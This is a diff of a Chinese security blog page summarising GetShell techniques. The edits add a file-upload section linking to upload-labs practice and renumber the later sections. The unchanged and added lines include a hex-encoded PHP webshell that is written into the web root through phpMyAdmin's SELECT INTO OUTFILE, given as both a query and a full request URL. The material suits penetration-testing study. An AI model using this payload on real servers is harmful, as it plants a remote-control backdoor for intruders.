@@ -6,7 +6,8 @@
     <meta charset="utf-8">
     <meta name="keywords" content="学习总结篇—GetShell, dylan&#39;s blog">
     <meta name="description" content="0x00 前言各种GetShell总结
-0x01 phpMyAdmin GetShell网站路径信息获取找网站的安装路径，其实就是通过“配置页面”或者“配置文件”找到Document Root 指向的网站路径位置，而Document Roo">
+0x01 文件上传upload-labs文件上传漏洞练习
+0x02 phpMyAdmin GetShell网站路径信息获取找网站的安装路径，其实就是通过“配置页面”或者“配置文件”找到Document">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -450,7 +451,8 @@
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>各种GetShell总结</p>
-<h1 id="0x01-phpMyAdmin-GetShell"><a href="#0x01-phpMyAdmin-GetShell" class="headerlink" title="0x01 phpMyAdmin GetShell"></a>0x01 phpMyAdmin GetShell</h1><h2 id="网站路径信息获取"><a href="#网站路径信息获取" class="headerlink" title="网站路径信息获取"></a>网站路径信息获取</h2><p>找网站的安装路径，其实就是通过“配置页面”或者“配置文件”找到Document Root 指向的网站路径位置，<br>而Document Root最常见的地方就是 phpinfo.php页面和httpd.conf配置文件中；</p>
+<h1 id="0x01-文件上传"><a href="#0x01-文件上传" class="headerlink" title="0x01 文件上传"></a>0x01 文件上传</h1><p><a href="https://dylan903.coding.me/2019/08/04/upload-labs-wen-jian-shang-chuan-lou-dong-lian-xi/">upload-labs文件上传漏洞练习</a></p>
+<h1 id="0x02-phpMyAdmin-GetShell"><a href="#0x02-phpMyAdmin-GetShell" class="headerlink" title="0x02 phpMyAdmin GetShell"></a>0x02 phpMyAdmin GetShell</h1><h2 id="网站路径信息获取"><a href="#网站路径信息获取" class="headerlink" title="网站路径信息获取"></a>网站路径信息获取</h2><p>找网站的安装路径，其实就是通过“配置页面”或者“配置文件”找到Document Root 指向的网站路径位置，<br>而Document Root最常见的地方就是 phpinfo.php页面和httpd.conf配置文件中；</p>
 <h3 id="phpinfo获取网站路径"><a href="#phpinfo获取网站路径" class="headerlink" title="phpinfo获取网站路径"></a>phpinfo获取网站路径</h3><h4 id="收集网站部署使用的套件信息"><a href="#收集网站部署使用的套件信息" class="headerlink" title="收集网站部署使用的套件信息"></a>收集网站部署使用的套件信息</h4><p>常见未删除phpinfo页面</p>
 <ul>
 <li>phpinfo.php</li>
@@ -639,7 +641,7 @@ set global general_log=&#39;off&#39;;              //关闭general_log模式</co
 <li>参数pos=0</li>
 </ul>
 <pre><code>&amp;sql_query=/*!50001select*/ 0x3c3f7068702024613d636f6e766572745f75756465636f646528222638372d5339372954206022293b40246128245f504f53545b27212a21275d293b3f3e into outfile &#39;C:\\phpStudy\\WWW\\bypass.php&#39;;</code></pre><p>例如</p>
-<pre><code>http://127.0.0.1/phpmyadmin/sql.php?db=数据库名&amp;token=token值&amp;table=数据表名&amp;pos=0&amp;sql_query=/*!50001select*/ 0x3c3f7068702024613d636f6e766572745f75756465636f646528222638372d5339372954206022293b40246128245f504f53545b27212a21275d293b3f3e into outfile &#39;C:\\phpStudy\\WWW\\bypass.php&#39;;</code></pre><h1 id="CMS-GetShell"><a href="#CMS-GetShell" class="headerlink" title="CMS GetShell"></a>CMS GetShell</h1><h2 id="WordPress-1"><a href="#WordPress-1" class="headerlink" title="WordPress"></a>WordPress</h2><p><a href="https://dylan903.coding.me/2019/11/06/wordpress-hou-tai-getshell-zong-jie/">Wordpress 后台GetShell总结</a></p>
+<pre><code>http://127.0.0.1/phpmyadmin/sql.php?db=数据库名&amp;token=token值&amp;table=数据表名&amp;pos=0&amp;sql_query=/*!50001select*/ 0x3c3f7068702024613d636f6e766572745f75756465636f646528222638372d5339372954206022293b40246128245f504f53545b27212a21275d293b3f3e into outfile &#39;C:\\phpStudy\\WWW\\bypass.php&#39;;</code></pre><h1 id="0x03-CMS-GetShell"><a href="#0x03-CMS-GetShell" class="headerlink" title="0x03 CMS GetShell"></a>0x03 CMS GetShell</h1><h2 id="WordPress-1"><a href="#WordPress-1" class="headerlink" title="WordPress"></a>WordPress</h2><p><a href="https://dylan903.coding.me/2019/11/06/wordpress-hou-tai-getshell-zong-jie/">Wordpress 后台GetShell总结</a></p>
 <h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://bbs.ichunqiu.com/thread-19893-1-1.html" target="_blank" rel="noopener">PhpMyAdmin 网站路径信息获取</a><br><a href="https://blog.csdn.net/q1352483315/article/details/88904001" target="_blank" rel="noopener">总结下写phpmyadmin写shell的方法</a><br><a href="https://xz.aliyun.com/t/3283" target="_blank" rel="noopener">phpmyadmin getshell姿势 - 先知社区</a></p>
 
             </div>
